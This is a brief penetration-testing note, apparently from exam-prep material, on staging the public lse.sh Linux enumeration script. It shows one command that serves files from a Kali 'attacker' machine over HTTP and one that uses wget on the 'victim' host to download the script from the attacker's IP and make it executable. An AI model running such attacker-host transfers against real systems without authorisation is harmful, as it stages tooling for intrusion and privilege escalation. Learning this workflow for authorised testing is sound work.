LSE.sh

https://github.com/diego-treitos/linux-smart-enumeration/tree/master

Host the script on KALI ATTACKER
```
cd ~/Desktop/Tools && python -m http.server 8888
```

Grab the script from VICTIM HOST
```
wget http://192.168.45.232:8888/lse.sh && chmod 700 lse.sh
```
